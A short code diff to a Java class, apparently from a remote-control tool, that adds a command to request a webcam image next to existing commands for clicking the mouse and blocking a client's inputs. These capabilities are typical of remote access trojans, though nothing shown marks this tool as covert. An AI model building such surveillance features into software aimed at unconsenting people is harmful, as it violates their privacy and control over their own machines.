@@ -31,6 +31,10 @@ public class ClientTasks {
 		add("clickmouse", Integer.toString(button) + "," + x + "," + y);
 	}
 	
+	public void requestWebcamImage(boolean b) {
+		add("webcam", String.valueOf(b));
+	}
+	
 	public void blockInputs(boolean block) {
 		add("blockinputs", String.valueOf(block));
 	}
